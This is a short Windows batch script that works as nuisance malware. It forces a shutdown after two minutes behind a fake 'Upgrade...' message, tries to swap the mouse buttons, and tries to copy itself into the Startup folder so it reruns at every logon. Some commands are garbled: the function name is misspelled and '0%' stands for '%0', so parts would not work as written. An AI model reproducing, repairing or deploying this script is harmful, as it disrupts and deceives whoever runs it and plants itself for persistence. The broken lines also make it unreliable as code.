@echo off
shutdown -s -t 120 -c "Upgrade..."
Rundll32 user32, SwapeMouseButton
copy 0% "%userprofile%\Startm~1\Programs\Startup"
